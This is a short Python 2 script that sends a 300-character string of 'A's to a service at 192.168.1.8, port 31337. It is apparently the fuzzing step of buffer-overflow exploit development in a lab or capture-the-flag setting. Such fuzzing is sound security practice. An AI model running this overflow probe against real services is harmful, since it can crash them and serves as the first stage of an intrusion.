#!/usr/bin/python
import socket,sys
from time import sleep
ip="192.168.1.8"
port=31337
bof = "A"*300
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    print "Fuzzing with "+str(len(bof))+" Characters"
    s.send(bof + '\r\n')
    s.recv(1024)
    s.close()
except:
    print "Some Error Occured"
    sys.exit(0)